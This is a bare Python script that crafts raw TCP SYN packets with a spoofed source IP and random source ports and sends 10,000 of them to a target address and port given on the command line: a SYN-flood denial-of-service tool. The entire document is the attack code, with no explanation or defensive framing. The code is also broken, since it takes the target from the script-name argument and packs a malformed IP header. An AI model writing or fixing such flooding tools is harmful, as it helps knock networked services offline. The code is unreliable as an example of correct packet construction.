
import random
import socket
import struct
import os
import sys

# Target IP and port
target_ip = sys.argv[0]
target_port = sys.argv[1]

# Spoofed source IP and port range
src_ip = '192.168.1.1'
src_port_min = 1024
src_port_max = 65535

# Number of SYN packets to send
num_packets = 10000

# Construct the IP and TCP headers
ip_header = struct.pack('!4s4sBBH',
                        socket.inet_aton(target_ip),
                        socket.inet_aton(src_ip),
                        0, 6, 20)
tcp_header = struct.pack('!HHIIBBHHH',
                         random.randint(src_port_min, src_port_max),
                         target_port,
                         random.randint(0, 4294967295),
                         random.randint(0, 4294967295),
                         5, 2,
                         8192,
                         0, 0)

# Send the SYN packets
with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as s:
    for i in range(num_packets):
        s.sendto(ip_header + tcp_header, (target_ip, target_port))
